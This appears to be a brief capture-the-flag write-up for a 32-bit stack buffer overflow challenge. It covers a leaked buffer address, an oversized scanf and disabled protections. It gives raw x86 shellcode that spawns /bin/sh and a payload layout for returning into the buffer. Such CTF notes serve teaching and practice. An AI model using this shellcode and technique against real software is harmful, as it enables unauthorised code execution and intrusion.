**Read source code**
- We can see there the program leak the address of buf `printf("buf = (%p)\n", buf);`
- `buf`(0x80) but scanf `scanf("%141s", buf);` => Buffer overflow
- `Checksec` in gdb
```
Arch:     i386
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
- So the idea is that store the shellcode into `buf` and return adress of buff.
---  
***PWNTOOLS***
- shellcode for x86 `\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80`
- payload = shellcode + (offset from buff to ret) + buf
